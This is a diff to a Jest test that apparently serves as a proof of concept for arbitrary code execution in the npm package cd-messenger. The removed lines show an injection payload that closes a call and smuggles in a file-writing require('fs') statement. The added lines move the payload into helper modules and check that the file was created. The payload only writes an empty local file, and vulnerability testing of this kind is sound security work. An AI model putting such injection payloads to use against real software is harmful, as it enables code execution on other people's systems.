@@ -1,16 +1,21 @@
 test("Arbitrary code execution in cd-messenger", () => {
-  expect.assertions(2);
+  const { exploitFunction } = require("./function.js");
+  const { getPayload } = require('./payload.js');
   const fs = require("fs");
-  const a = require("cd-messenger");
+
   const path = "./cd-messenger";
-  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
-  data = {};
-  file_exist = fs.existsSync(path);
+  let file_exist = fs.existsSync(path);
+
   expect(file_exist).toBe(false);
-  try {
-    a.line(payload);
-  } catch (error) {}
+
+  const payload = getPayload();
+  exploitFunction(payload);
+
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
+
+  const fileContent = fs.readFileSync(path, 'utf8');
+  expect(fileContent).toBe('');
+
   fs.unlink(path, function (err) {});
 });
